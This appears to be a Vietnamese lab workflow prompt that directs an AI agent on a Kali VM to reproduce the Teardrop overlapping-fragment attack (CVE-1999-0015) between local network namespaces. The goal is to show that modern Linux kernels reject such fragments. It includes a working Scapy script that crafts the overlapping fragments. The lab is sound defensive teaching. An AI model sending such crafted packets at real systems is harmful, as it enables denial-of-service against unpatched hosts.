# WORKFLOW EXECUTION: LAB 06 - TEARDROP ATTACK (OVERLAPPING IP FRAGMENTS)

Bạn hãy đóng vai trò là một **Senior Linux Kernel Security Engineer, Network Protocol Researcher và Packet Crafting Specialist**.

## 1. MỤC TIÊU & BỐI CẢNH KỸ THUẬT
- **Mục tiêu:** Thực thi mô phỏng kỹ thuật tấn công phân mảnh chồng lấn Teardrop Attack (CVE-1999-0015) trong môi trường Linux Network Namespace cục bộ trên máy ảo Kali Linux thông qua tool `kali-vm:ssh_execute`.
- **Cơ chế cốt lõi:** Khi gói tin IP vượt quá MTU, nó bị chia thành nhiều mảnh (fragments) và được ghép lại tại đích dựa vào trường `Fragment Offset` (tính theo đơn vị 8 bytes) và cờ `MF` (More Fragments). Teardrop cố tình gửi 2 mảnh có vùng dữ liệu đè lên nhau (Mảnh 1: `offset = 0`, dài 24 bytes; Mảnh 2: `offset = 1` tức bắt đầu từ byte thứ 8, dài 24 bytes). Trên các hệ điều hành cũ (Windows 95/NT, Linux < 2.0.32), thuật toán tái hợp tính toán sai độ dài vùng nhớ còn lại (ra số âm) gây tràn bộ đệm hoặc Kernel Panic.
- **Mục tiêu phòng thủ:** Chứng minh thực nghiệm rằng nhân Linux hiện đại kiểm tra biên (boundary checking) chặt chẽ khi tái hợp mảnh (`ip_frag_reasm`), tự động nhận diện mảnh chồng lấn, tăng bộ đếm lỗi trong `/proc/net/snmp` (`ReasmFails`) và hủy gói tin an toàn mà không bị crash.

---

## 2. QUY TRÌNH THỰC THI CHI TIẾT (5 GIAI ĐOẠN)

### GIAI ĐOẠN 1: Chuẩn bị Script Cục bộ & Khởi tạo Topology
1. Tạo thư mục `docs/progress/LAB06/scripts/` trên workspace host.
2. Tạo script `setup_pair.sh`:
   - Dọn dẹp sạch các namespace cũ (`h1`, `h2`, `vic`, `atk`, `gw`, `dst`, `amp*`) và bridge `br0` nếu còn tồn tại.
   - Dựng 2 namespace: `h1` (`10.0.0.1/24`) đóng vai Attacker, `h2` (`10.0.0.2/24`) đóng vai Victim nối với nhau qua cặp `veth1 <-> veth2`.
   - Bật giao diện `lo`, `veth1`, `veth2` và kiểm tra kết nối ping baseline (`ping -c 2 10.0.0.2`).
3. Tạo script Scapy tấn công `teardrop.py`:
   ```python
   from scapy.all import IP, send

   dst = "10.0.0.2"
   ipid = 1234

   # Mảnh 1: offset = 0 (byte 0..23), cờ MF = 1 (còn mảnh tiếp theo), tải 24 bytes chữ 'A'
   f1 = IP(dst=dst, id=ipid, flags="MF", frag=0, proto=17) / (b"A" * 24)

   # Mảnh 2: offset = 1 (tức bắt đầu tại byte thứ 8 -> byte 8..31), cờ MF = 0 (mảnh cuối)
   # Chồng lấn (overlap) 16 bytes với Mảnh 1 (từ byte 8 đến byte 23)
   f2 = IP(dst=dst, id=ipid, flags=0, frag=1, proto=17) / (b"B" * 24)

   send([f1, f2], verbose=0)
   print(f"[+] Sent 2 overlapping IP fragments (Teardrop ID={ipid}) to {dst}")
   ```

### GIAI ĐOẠN 2: Triển khai lên Kali VM & Ghi nhận Baseline "Sức khỏe" Victim
1. Dùng `ssh_execute` tạo thư mục `/tmp/lab06` trên Kali VM, đẩy các script lên và cấp quyền thực thi.
2. Chạy `setup_pair.sh`.
3. Ghi nhận thống kê tái hợp mảnh IP (Baseline SNMP) trên `h2` trước khi tấn công:
   ```bash
   ip netns exec h2 sh -c "cat /proc/net/snmp | grep -A1 '^Ip:'" > /tmp/lab06/snmp_before.log
   cat /tmp/lab06/snmp_before.log
   ```
   (Phân tích kỹ các cột `ReasmReqds`, `ReasmOKs`, `ReasmFails`).

### GIAI ĐOẠN 3: Giám sát Nền & Phát động Tấn công Teardrop
1. Mở `tcpdump` trên `h2` (timeout 8 giây) để bắt chi tiết các mảnh IP đến:
   ```bash
   ip netns exec h2 timeout 8 tcpdump -i veth2 -nn -v ip > /tmp/lab06/tcpdump_h2_frag.log 2>&1 &
   ```
2. Mở một luồng ping kiểm tra sức sống liên tục từ `h2` về `h1` (gửi 10 gói, khoảng cách 0.3 giây) chạy song song trong lúc tấn công:
   ```bash
   ip netns exec h2 ping -i 0.3 -c 10 10.0.0.1 > /tmp/lab06/ping_health.log 2>&1 &
   ```
3. Chờ 1 giây rồi phát động tấn công từ `h1` (gửi lặp hoặc chạy script để quan sát rõ sự thay đổi bộ đếm):
   ```bash
   ip netns exec h1 python3 /tmp/lab06/teardrop.py
   ```
4. Chờ 4 giây để cả hai tiến trình `tcpdump` và `ping` hoàn tất.

### GIAI ĐOẠN 4: Thu thập Bằng chứng Hậu Tấn công & Kiểm chứng Kernel
1. Đọc kết quả `/tmp/lab06/tcpdump_h2_frag.log` để xác nhận 2 mảnh IP mang cùng id 1234 với offset 0 và offset 8 đã đến `veth2`.
2. Đọc kết quả `/tmp/lab06/ping_health.log` để xác nhận victim `h2` vẫn sống 100% (0% packet loss, không hề bị treo hay crash).
3. Ghi nhận lại thống kê `/proc/net/snmp` sau tấn công:
   ```bash
   ip netns exec h2 sh -c "cat /proc/net/snmp | grep -A1 '^Ip:'" > /tmp/lab06/snmp_after.log
   cat /tmp/lab06/snmp_after.log
   ```
4. Kiểm tra nhật ký nhân Linux (`dmesg`) để chứng minh không có Kernel Panic / Oops:
   ```bash
   dmesg | tail -n 15
   ```

### GIAI ĐOẠN 5: Tổng hợp Báo cáo & Dọn dẹp Môi trường
1. Tạo tệp `docs/progress/LAB06/IMPLEMENTATION.md`:
   - Giải thích chi tiết toán học của trường Fragment Offset (đơn vị 8-byte blocks), cờ MF và DF trong IPv4 Header (RFC 791).
   - Vẽ sơ đồ ASCII minh họa vùng chồng lấn byte giữa Mảnh 1 (`[0..23]`) và Mảnh 2 (`[8..31]`).
   - Giải thích cơ chế phòng thủ Fragment Scrubbing trên Firewall (RFC 1858) và cơ chế phát hiện mảnh chồng lấn của Linux Kernel hiện đại.
2. Tạo tệp `docs/progress/LAB06/lab6_result.md` theo đúng định dạng yêu cầu ở Mục 3 bên dưới.
3. Dọn dẹp sạch môi trường:
   ```bash
   ip netns del h1 2>/dev/null || true
   ip netns del h2 2>/dev/null || true
   rm -rf /tmp/lab06
   ```
4. Đánh dấu `[x]` cho Lab 06 trong `PLAN.md`.

---

## 3. YÊU CẦU CẤU TRÚC BÁO CÁO docs/progress/LAB06/lab6_result.md
Tệp báo cáo kết quả phải bao gồm:
- **Metadata:** Thời gian thực thi, Kernel version, Công cụ sử dụng.
- **Terminal Outputs thô (Raw Logs):** Đầy đủ output của `setup_pair.sh`, `snmp_before.log`, `tcpdump_h2_frag.log`, `ping_health.log`, `snmp_after.log`, và `dmesg`.
- **BÓC TÁCH & PHÂN TÍCH CHUYÊN SÂU LOG TERMINAL (BẮT BUỘC):**
  - **Giải phẫu Log tcpdump:** Trích xuất 2 dòng gói tin phân mảnh trong `tcpdump_h2_frag.log`. Giải thích tại sao trong Scapy ta truyền `frag=1` nhưng tcpdump lại in ra `offset 8` (vì $1 \times 8\text{ bytes} = 8$), tại sao mảnh 1 có `flags [+]` (More Fragments) còn mảnh 2 có `flags [none]`.
  - **Phân tích Toán học Vùng Chồng lấn (Overlap Calculation):** Chỉ rõ Mảnh 1 chiếm byte 0 $\rightarrow$ 23 (24 bytes), Mảnh 2 bắt đầu từ byte 8 $\rightarrow$ 31 (24 bytes) $\Rightarrow$ Vùng chồng lấn nằm từ byte 8 $\rightarrow$ 23 (16 bytes). Giải thích tại sao trên hệ thống cũ phép trừ độ dài gây ra số âm (Integer Underflow) khi cấp phát/sao chép `memcpy`.
  - **Đối chiếu Bảng Chỉ số /proc/net/snmp (Trước vs. Sau):** Lập bảng so sánh trực tiếp các trường `InReceives`, `ReasmReqds`, `ReasmOKs`, `ReasmFails` trước và sau khi chạy `teardrop.py`. Giải thích ý nghĩa sự gia tăng của `ReasmReqds` và `ReasmFails`.
  - **Kết luận về Khả năng Miễn nhiễm:** Dựa trên log `ping_health.log` (0% loss) và `dmesg`, kết luận về cơ chế tự bảo vệ của Kernel 6.12 trước CVE-1999-0015.

---

## 4. STRICT RULES
- Mọi thao tác trên Kali VM BẮT BUỘC gọi qua `kali-vm:ssh_execute`.
- Các lệnh `tcpdump` và `ping` theo dõi sức khỏe BẮT BUỘC phải giới hạn bằng timeout hoặc `-c` (count) để không làm treo phiên SSH.
- Tuyệt đối không bịa đặt số liệu SNMP; toàn bộ thông số trong `lab6_result.md` phải trích xuất nguyên văn từ `/proc/net/snmp` thực tế của Kali VM.
